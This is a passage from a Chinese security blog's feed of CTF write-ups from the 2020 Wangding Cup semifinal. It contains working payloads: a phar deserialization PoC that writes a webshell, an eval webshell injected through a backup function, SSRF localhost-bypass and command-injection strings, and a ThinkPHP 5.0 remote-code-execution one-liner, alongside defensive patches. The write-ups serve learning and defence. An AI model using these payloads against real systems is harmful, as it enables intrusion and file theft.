class="keyword">$this</span>-&gt;goder_text=$aaa;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"poc.phar"</span>);</div><div class="line">$phar-&gt;startBuffering();</div><div class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</div><div class="line">$a=<span class="keyword">new</span> User($aaa);</div><div class="line">$phar-&gt;setMetadata($a);</div><div class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</div><div class="line">$phar-&gt;stopBuffering();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>注意这里需要在http header当中设置一个登录后的session id，因为这里访问本地的时候做了登录检查，如下：</p><p>finger/index.php第二行，包含了login_requre.php</p><p><img src="http://pic.c1imber.top/blog/20201214/4DMxdA3zqWII.png?imageslim" alt="mark"></p><p>login_requre.php当中进行了session登录认证</p><p><img src="http://pic.c1imber.top/blog/20201214/1pbCm0Ba8ImV.png?imageslim" alt="mark"></p><p>场景复现</p><p>用docker在本地搭一个和比赛一样的镜像，需要安装php-soap扩展</p><p><img src="http://pic.c1imber.top/blog/20201214/PTbdEGMuiuot.png?imageslim" alt="mark"></p><p>注册上传图片，图片内容改成上面poc生成的phar文件</p><p><img src="http://pic.c1imber.top/blog/20201214/mCsUf5R3zLFk.png?imageslim" alt="mark"></p><p>登录账号，给poc当中的sessionid授权</p><p><img src="http://pic.c1imber.top/blog/20201214/dU9phcbNO9MH.png?imageslim" alt="mark"></p><p>phar触发反序列化，写入webshell</p><p><img src="http://pic.c1imber.top/blog/20201214/BYl7NpID5H0u.png?imageslim" alt="mark"></p><p>成功写入：</p><p><img src="http://pic.c1imber.top/blog/20201214/oRLsOwDHGCKu.png?imageslim" alt="mark"></p><h3 id="novel"><a href="#novel" class="headerlink" title="novel"></a>novel</h3><p>漏洞：备份功能代码处理不当而导致的任意代码执行</p><p>class/back.class.php 第19行-第28行：<code>backup</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backup</span><span class="params">($filename, $dest)</span></span>&#123;</div><div class="line">   $filename=<span class="string">'profile/'</span>.$filename;</div><div class="line">   <span class="keyword">if</span>(file_exists($filename))&#123;</div><div class="line">      $content=htmlspecialchars(file_get_contents($filename),ENT_QUOTES);</div><div class="line">      $password=<span class="keyword">$this</span>-&gt;random_code();</div><div class="line">      $r[<span class="string">'path'</span>]=<span class="keyword">$this</span>-&gt;_write($dest, <span class="keyword">$this</span>-&gt;_create($password, $content));</div><div class="line">      $r[<span class="string">'password'</span>]=$password;</div><div class="line">      <span class="keyword">echo</span> json_encode($r);</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* 先验证保证为备份文件后,再保存为私藏文件 */</span></div><div class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_write</span><span class="params">($dest, $content)</span></span>&#123;</div><div class="line">   $f1=$dest;</div><div class="line">   $f2=<span class="string">'private/'</span>.<span class="keyword">$this</span>-&gt;random_code(<span class="number">10</span>).<span class="string">".php"</span>;</div><div class="line"></div><div class="line">   $stream_f1 = fopen($f1, <span class="string">'w+'</span>);</div><div class="line"></div><div class="line">   fwrite($stream_f1, $content);</div><div class="line">   rewind($stream_f1);</div><div class="line">   $f1_read=fread($stream_f1, <span class="number">3000</span>);</div><div class="line">   </div><div class="line">   preg_match(<span class="string">'/^&lt;\?php \$_GET\[\"password\"\]===\"[a-zA-Z0-9]&#123;8&#125;\"\?print\(\".*\"\):exit\(\); $/s'</span>, $f1_read, $matches);</div><div class="line">   </div><div class="line">   <span class="keyword">if</span>(!<span class="keyword">empty</span>($matches[<span class="number">0</span>]))&#123;</div><div class="line">      copy($f1,$f2);</div><div class="line">      fclose($stream_f1);   </div><div class="line">      <span class="keyword">return</span> $f2;     </div><div class="line">   &#125;<span class="keyword">else</span>&#123;</div><div class="line">      fwrite($stream_f1, <span class="string">'&lt;?php exit(); ?&gt;'</span>);</div><div class="line">      fclose($stream_f1);</div><div class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_create</span><span class="params">($password, $content)</span></span>&#123;</div><div class="line">   $_content=<span class="string">'&lt;?php $_GET["password"]==="'</span>.$password.<span class="string">'"?print("'</span>.$content.<span class="string">'"):exit(); '</span>;</div><div class="line">   <span class="keyword">return</span> $_content;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">random_code</span><span class="params">($length = <span class="number">8</span>,$chars = null)</span></span>&#123;</div><div class="line">   <span class="keyword">if</span>(<span class="keyword">empty</span>($chars))&#123;</div><div class="line">       $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</div><div class="line">   &#125;</div><div class="line">   $count = strlen($chars) - <span class="number">1</span>;</div><div class="line">   $code = <span class="string">''</span>;</div><div class="line">   <span class="keyword">while</span>( strlen($code) &lt; $length)&#123;</div><div class="line">      $code .= substr($chars,rand(<span class="number">0</span>,$count),<span class="number">1</span>);</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">return</span> $code;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这段代码大概就是把<code>$content</code>变量的内容写入php文件，之后设置随机密码，但是写入之前单引号双引号被<code>htmlspecialchars</code>函数转义了，不能闭合<code>print</code>函数，并且这里还存在正则检测，会对写入的代码进行匹配。但是这里<code>print</code>函数打印<code>$content</code>变量用的是双引号，于是通过php当中双引号可以解析变量的特性就可以进行绕过</p><p>可以通过<code>${phpcode}</code>这种方式去执行<code>phpcode</code>代码部分</p><p>首先上传txt，内容传入<code>${@eval($_GET[1])};</code></p><p><img src="http://pic.c1imber.top/blog/20201214/viCwP3qSoeUY.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20201214/igz18J5ruDJz.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20201214/9wzAt3fOioUx.png?imageslim" alt="mark"></p><p>然后对txt进行备份，这里/private/vrKJjXTDVw.php写入的内容就变成了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $_GET[<span class="string">"password"</span>]===<span class="string">"f1jUc24l"</span>?<span class="keyword">print</span>(<span class="string">"$&#123;@eval($_GET[1])&#125;;"</span>):<span class="keyword">exit</span>();</div></pre></td></tr></table></figure><p>因为<code>print</code>的双引号可以解析变量，所以这里构造的php代码并不是被<code>print</code>函数输出，而是被执行了</p><p>获取flag</p><pre><code>http://172.16.9.23:9014/private/vrKJjXTDVw.php?password=f1jUc24l&amp;1=system(%27cat%20/flag%27);</code></pre><p><img src="http://pic.c1imber.top/blog/20201214/G8JKJhW6OmLi.png?imageslim" alt="mark"></p><p><strong>patch：</strong></p><p>第56行，修改为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_content=<span class="string">"&lt;?php $_GET['password']==='"</span>.$password.<span class="string">"'?print('"</span>.$content.<span class="string">"'):exit(); "</span>;</div></pre></td></tr></table></figure><p>这里把<code>print</code>函数的双引号换成了单引号，防止变量被解析</p><p>然后需要修改正则，第41行，修改为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match(<span class="string">"/^&lt;\?php \$_GET\[\'password\'\]===\'[a-zA-Z0-9]&#123;8&#125;\'\?print\(\'.*\'\):exit\(\); $/s"</span>, $f1_read, $matches);</div></pre></td></tr></table></figure><h3 id="vulnfaces"><a href="#vulnfaces" class="headerlink" title="vulnfaces"></a>vulnfaces</h3><p>完全没思路的一道题，赛后百度了一下才知道题目环境用的是RichFaces，应该是CVE-2018-12533（EL表达式注入），但是有过滤，绕不过去，有时间要好好研究一下，填个坑</p><p>web题目现在在BUUCTF（<a href="https://buuoj.cn/challenges）平台上都有了，没有代码无法搭环境学习复现的同学，可以去这个平台上做" target="_blank" rel="external">https://buuoj.cn/challenges）平台上都有了，没有代码无法搭环境学习复现的同学，可以去这个平台上做</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;game-exp&quot;&gt;&lt;a href=&quot;#game-exp&quot; class=&quot;headerlink&quot; title=&quot;game_exp&quot;&gt;&lt;/a&gt;game_exp&lt;/h3&gt;&lt;p&gt;漏洞一：phar反序列化&lt;/p&gt;
&lt;p&gt;regiter.php当中第3行-第9行：&lt;/p&gt;

      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯半决赛web题</title>
    <link href="https://c1aysec.github.io/2020/12/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9Bweb%E9%A2%98/"/>
    <id>https://c1aysec.github.io/2020/12/14/2020网鼎杯半决赛web题/</id>
    <published>2020-12-13T16:02:46.922Z</published>
    <updated>2021-01-15T06:48:27.617Z</updated>
    
    <content type="html"><![CDATA[<h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>第一次参加网鼎杯线下，由于太忙，这篇文章晚了一些，这次网鼎的赛制不同于以往线下的AWD模式，而是以一种AWD Plus的模式。</p><h3 id="AWD-Plus规则简述"><a href="#AWD-Plus规则简述" class="headerlink" title="AWD Plus规则简述"></a>AWD Plus规则简述</h3><p>每个队伍会有相同的靶机和题目源码，得分分值分为攻击分值和防御分值两部分，攻击分值就是选手需要先找到靶机存在的漏洞，然后通过构造可以利用成功的exp获取靶机的flag提交获取的分值，防御分值是选手需要提交相应的修复代码给平台，平台每隔一段时间会自动对赛场选手的靶机进行攻击，被平台攻击成功的队伍获取flag的队伍会失去防御分值，反之，防御成功就会获得相应的防御分值，还有一点需要注意的就是选手提交的修复代码不能导致靶机环境服务异常，否则会有异常扣分。</p><p>通过规则可以看到该赛制其实是一种ctf线上赛+一些AWD元素的模式，和AWD相比少了选手之间的攻击和权限维持等元素</p><p>下面说一下题目（部分web题目因为题目原因或者是自己还没有掌握，暂时先放一放，回头再填坑）</p><h3 id="AliceWebsite"><a href="#AliceWebsite" class="headerlink" title="AliceWebsite"></a>AliceWebsite</h3><p>index.php第30行，很明显的文件包含</p><p><img src="http://pic.c1imber.top/blog/20201214/lQpxVsgOeOWy.png?imageslim" alt="mark"></p><p>获取flag，忘记截图了</p><p><a href="http://172.16.9.13:9002/index.php?action=/flag" target="_blank" rel="external">http://172.16.9.13:9002/index.php?action=/flag</a></p><p>flag{885e4f3b-5f02-454c-ba8d-dbbb6d77c7be}</p><p><strong>patch</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$action = (<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) ? $_GET[<span class="string">'action'</span>] : <span class="string">'home.php'</span>);</div><div class="line">$file = dirname(<span class="keyword">__FILE__</span>).<span class="string">"/"</span>.pathinfo($action)[<span class="string">"filename"</span>].<span class="string">".php"</span>;</div><div class="line"><span class="keyword">if</span> (file_exists($action)) &#123;</div><div class="line">    <span class="keyword">include</span> $file;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"File not found!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><h3 id="babyjs"><a href="#babyjs" class="headerlink" title="babyjs"></a>babyjs</h3><p>主要考察：</p><p>1、ssrf绕过</p><p>2、node.js url.parse函数解析url的一些特性而导致的一些绕过方法</p><p>题目代码，看路由文件：routes/index.js，可以看到是nodejs代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</div><div class="line"><span class="keyword">var</span> config = <span class="built_in">require</span>(<span class="string">'../config'</span>);</div><div class="line"><span class="keyword">var</span> url=<span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"><span class="keyword">var</span> child_process=<span class="built_in">require</span>(<span class="string">'child_process'</span>);</div><div class="line"><span class="keyword">var</span> fs=<span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">var</span> request=<span class="built_in">require</span>(<span class="string">'request'</span>);</div><div class="line"><span class="keyword">var</span> router = express.Router();</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">var</span> blacklist=[<span class="string">'127.0.0.1.xip.io'</span>,<span class="string">'::ffff:127.0.0.1'</span>,<span class="string">'127.0.0.1'</span>,<span class="string">'0'</span>,<span class="string">'localhost'</span>,<span class="string">'0.0.0.0'</span>,<span class="string">'[::1]'</span>,<span class="string">'::1'</span>];</div><div class="line"></div><div class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">    res.json(&#123;&#125;);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">router.get(<span class="string">'/debug'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(req.ip);</div><div class="line">    <span class="keyword">if</span>(blacklist.indexOf(req.ip)!=<span class="number">-1</span>)&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'res'</span>);</div><div class="line"><span class="keyword">var</span> u=req.query.url.replace(<span class="regexp">/[\"\']/ig</span>,<span class="string">''</span>);</div><div class="line"><span class="built_in">console</span>.log(url.parse(u).href);</div><div class="line"><span class="keyword">let</span> log=<span class="string">`echo  '<span class="subst">$&#123;url.parse(u).href&#125;</span>'&gt;&gt;/tmp/log`</span>;</div><div class="line"><span class="built_in">console</span>.log(log);</div><div class="line">child_process.exec(log);</div><div class="line">res.json(&#123;<span class="attr">data</span>:fs.readFileSync(<span class="string">'/tmp/log'</span>).toString()&#125;);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        res.json(&#123;&#125;);</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line"></div><div class="line">router.post(<span class="string">'/debug'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(req.body);</div><div class="line">    <span class="keyword">if</span>(req.body.url !== <span class="literal">undefined</span>) &#123;</div><div class="line">        <span class="keyword">var</span> u = req.body.url;</div><div class="line"><span class="keyword">var</span> urlObject=url.parse(u);</div><div class="line"><span class="keyword">if</span>(blacklist.indexOf(urlObject.hostname) == <span class="number">-1</span>)&#123;</div><div class="line"><span class="keyword">var</span> dest=urlObject.href;</div><div class="line">request(dest,(err,result,body)=&gt;&#123;</div><div class="line">res.json(body);</div><div class="line">&#125;)</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">res.json([]);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = router;</div></pre></td></tr></table></figure><p>大致读一遍代码：</p><p>首先在blacklist数组当中设置了一些不同格式的内网ip，然后是三条路由</p><p>先看<code>router.get(&#39;/debug&#39;, function(req, res, next)</code>，这里对<code>req.ip</code>进行了检查，要求<code>req.ip</code>的值必须在<code>blacklist</code>数组当中，不然请求过去会直接返回空<code>{}</code>，之后使用<code>req.query.url</code>接收get方式传入的url参数，将url参数值当中的单双引号替换成空后赋值给变量u，之后通过<code>url.parse(u).href</code>解析出url值当中的href，之后就是拼接为<code>echo  &#39;${url.parse(u).href}&#39;&gt;&gt;/tmp/log</code>这题命令，执行，之后返回/tmp/log当中写入的内容，简单来说就是把get传入的url参数当中的href部分写入/tmp/log，然后输出</p><p>这里的<code>req.ip</code>指的是request请求的原始源ip，也就是remoteAddress，可以理解成php当中的<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>。所以这里直接以get方式请求/debug是不行的，均会返回<code>{}</code>，这里需要<code>req.ip</code>的值为<code>blacklist</code>当中的本地ip，到了这里大概可以看出是需要找一个ssrf</p><p>第一步：绕内网ip</p><p>提一下常见的方法：</p><pre><code>localhost特殊域名： 127.0.0.1.xip.ioip 8进制格式：127.0.0.1-&gt; 0177.0.0.1ip 16进制格式：127.0.0.1-&gt;0x7f.0.0.1ip 10进制整数格式：127.0.0.1-&gt;2130706433ip 16进制整数格式：127.0.0.1-&gt;0x7F000001ipv6: 0:0:0:0:0:0:7f00:01、0:0:0:0:0:0:0:1、::1、ip6-localhost、x.1.ip6.name简写： 127.0.0.1-&gt;127.1、00.0.0.0等</code></pre><p>因为是黑名单，绕过方法有很多，这里使用ip进制转换的格式就能绕过</p><p>第二步：命令执行逃逸引号</p><p>因为在<code>router.get(&#39;/debug&#39;, function(req, res, next)</code>当中，将<code>req.query.url</code>当中的单双引号删除了，导致不能闭合引号执行命令，需要进行绕过</p><p>这里需要用到<code>url.parse()</code>函数解析url的一些特性去进行绕过</p><p>url格式：</p><pre><code>scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</code></pre><p>经过测试，发现<code>url.parse()</code>在解析url的时候，<code>[user[:password]</code>部分会自动进行url解码，利用这个特性就可以逃逸引号进行命令注入</p><p>本地测试demo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url=<span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line">u=<span class="string">"http://u%27:p%27@127.0.0.1%27:80%27/path%27?a%27=b%27#c%27"</span>;</div><div class="line"><span class="built_in">console</span>.log(url.parse(u));</div></pre></td></tr></table></figure><p>结果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Url &#123;</div><div class="line">  protocol: <span class="string">'http:'</span>,</div><div class="line">  slashes: <span class="literal">true</span>,</div><div class="line">  auth: <span class="string">'u\':p\''</span>,</div><div class="line">  host: <span class="string">'127.0.0.1'</span>,</div><div class="line">  port: <span class="literal">null</span>,</div><div class="line">  hostname: <span class="string">'127.0.0.1'</span>,</div><div class="line">  hash: <span class="string">'#c%27'</span>,</div><div class="line">  search: <span class="string">'?a%27=b%27'</span>,</div><div class="line">  query: <span class="string">'a%27=b%27'</span>,</div><div class="line">  pathname: <span class="string">'%27:80%27/path%27'</span>,</div><div class="line">  path: <span class="string">'%27:80%27/path%27?a%27=b%27'</span>,</div><div class="line">  href: <span class="string">'http://u\':p\'@127.0.0.1/%27:80%27/path%27?a%27=b%27#c%27'</span> &#125;</div></pre></td></tr></table></figure><p>可以看到auth和href部分的单引号内容被自动url解码了，而其它位置均不能被url解码</p><p>scheme部分当中如果有url编码，不光不会被url解码，还会变成下面这样，识别不到<code>[user[:password]</code>部分</p><p><img src="http://pic.c1imber.top/blog/20201214/awkjFjiOfB57.png?imageslim" alt="mark"></p><p>上面只是简单的例子，然而实际上<code>url.parse()</code>解析url是非常复杂的，可以看下面的例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url=<span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line">u=<span class="string">"aaa://%21%22%23%24%25%26%5c%27%28%29%2a%2b%2c%2d%2e%2f%30%31%32%33%34%35%36%37%38%39%3a%3b%3c%3d%3e%3f%40%41%42%43%44%45%46%47%48%49%4a%4b%4c%4d%4e%4f%50%51%52%53%54%55%56%57%58%59%5a%5b%5c%5c%5d%5e%5f%60%61%62%63%64%65%66%67%68%69%6a%6b%6c%6d%6e%6f%70%71%72%73%74%75%76%77%78%79%7a%7b%7c%7d%7e@11!$#%&amp;()*+,-.01@23456789&lt;=&gt;ABCDEFGHIJKLM NOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz&#123;&#125;|#111"</span>;</div><div class="line"><span class="built_in">console</span>.log(url.parse(u));</div></pre></td></tr></table></figure><p>结果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Url &#123;</div><div class="line">  protocol: <span class="string">'aaa:'</span>,</div><div class="line">  slashes: <span class="literal">true</span>,</div><div class="line">  auth:</div><div class="line">   <span class="string">'!"#$%&amp;\\\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~'</span>,</div><div class="line">  host: <span class="string">'11'</span>,</div><div class="line">  port: <span class="literal">null</span>,</div><div class="line">  hostname: <span class="string">'11'</span>,</div><div class="line">  hash:</div><div class="line">   <span class="string">'#%&amp;()*+,-.01@23456789%3C=%3EABCDEFGHIJKLM%20NOPQRSTUVWXYZ[]%5E_%60abcdefghijklmnopqrstuvwxyz%7B%7D%7C#111'</span>,</div><div class="line">  search: <span class="literal">null</span>,</div><div class="line">  query: <span class="literal">null</span>,</div><div class="line">  pathname: <span class="string">'/!$'</span>,</div><div class="line">  path: <span class="string">'/!$'</span>,</div><div class="line">  href:</div><div class="line">   <span class="string">'aaa://!%22%23%24%25%26%5C\'()*%2B%2C-.%2F0123456789:%3B%3C%3D%3E%3F%40ABCDEFGHIJKLMNOPQRSTUVWXYZ%5B%5C%5C%5D%5E_%60abcdefghijklmnopqrstuvwxyz%7B%7C%7D~@11/!$#%&amp;()*+,-.01@23456789%3C=%3EABCDEFGHIJKLM%20NOPQRSTUVWXYZ[]%5E_%60abcdefghijklmnopqrstuvwxyz%7B%7D%7C#111'</span> &#125;</div></pre></td></tr></table></figure><p>可以看到解析出的href当中第一个@字符前面的部分，只有<code>!&#39;()*-.:_~和数字大小写字母</code>会被url解码，或者可以理解成除了这些字符外，auth部分的其它字符都会被url编码，而第一个@字符后的内容，<code>&lt;&gt;空格^`{|}</code>这些字符都会被url编码，所以这里即使逃逸出了单引号，想要实现命令注入依旧很困难</p><p>说一下两个不那么完美的方法<br>方法一，使用cp命令：</p><pre><code>POST /debugurl=http://2130706433/debug?url=http://%2525271@123$(cp$IFS/flag$IFS/tmp/log)%2526%2523</code></pre><p><img src="http://pic.c1imber.top/blog/20201214/5oc688atcwOc.png?imageslim" alt="mark"></p><p>实际上执行的命令为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span>  <span class="string">'http://'</span>1@123/$(cp<span class="variable">$IFS</span>/flag<span class="variable">$IFS</span>/tmp/<span class="built_in">log</span>)&amp;<span class="comment">#'&gt;&gt;/tmp/log</span></div></pre></td></tr></table></figure><p>缺陷：只能读取文件</p><p>方法二，使用script命令：</p><p><a href="https://www.cnblogs.com/shineriver/p/10922970.html" target="_blank" rel="external">https://www.cnblogs.com/shineriver/p/10922970.html</a></p><pre><code>POST /debugurl=http://2130706433/debug?url=http://%2525271@123$(script$IFS-cwhoami$IFS-a$IFS/tmp/log)%2526%2523</code></pre><p><img src="http://pic.c1imber.top/blog/20201214/kl0sUnD01TM8.png?imageslim" alt="mark"></p><pre><code>POST /debugurl=http://2130706433/debug?url=http://%2525271@123$(script$IFS-cls$IFS-a$IFS/tmp/log)%2526%2523</code></pre><p><img src="http://pic.c1imber.top/blog/20201214/89PlduqqQl5w.png?imageslim" alt="mark"></p><p>缺陷：可以执行命令，但是执行的命令当中不能有空格，所以不能ls /、cat /flag这样去直接读flag文件</p><p>这道题可以直接用第一种方法读取/flag</p><p><img src="http://pic.c1imber.top/blog/20201214/bFfUp2lxjv8d.png?imageslim" alt="mark"></p><p>之所以这么麻烦其实是因为不能出网，不然逃逸出引号后可以直接通过远程下载sh脚本执行的方式去执行任意命令了，这里的环境下使用文件重定向的限制实在是太多。。。</p><p><strong>patch</strong></p><p>第20行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> u=req.query.url.replace(<span class="regexp">/[\"\']/ig</span>,<span class="string">''</span>);</div></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> u=req.query.url.replace(<span class="regexp">/[\"\'%27]/ig</span>,<span class="string">''</span>);</div></pre></td></tr></table></figure><p>防止被url编码绕过</p><h3 id="faka"><a href="#faka" class="headerlink" title="faka"></a>faka</h3><p>预期解应该是前台thinkphp rce（该题目使用的版本为thinkphp 5.0.14），题目分析先暂时放一下，有时间单独写篇文章</p><pre><code>POST /index.php_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=cat /flag.txt</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;第一次参加网鼎杯线下，由于太忙，这篇文章晚了一些，这次网鼎的赛制不同于以往线下的AWD模式，而是以一种AWD Plus的模式。&lt;/p&gt;
&lt;h3 id
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020全国电信和互联网行业网络安全竞赛wp</title>
    <link href="https://c1aysec.github.io/2020/12/07/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bwp/"/>
    <id>https://c1aysec.github.io/2020/12/07/2020全国电信和互联网行业网络安全竞赛wp/</id>
    <published>2020-12-07T09:24:36.060Z</published>
    <updated>2020-12-08T04:45:26.907Z</updated>
    
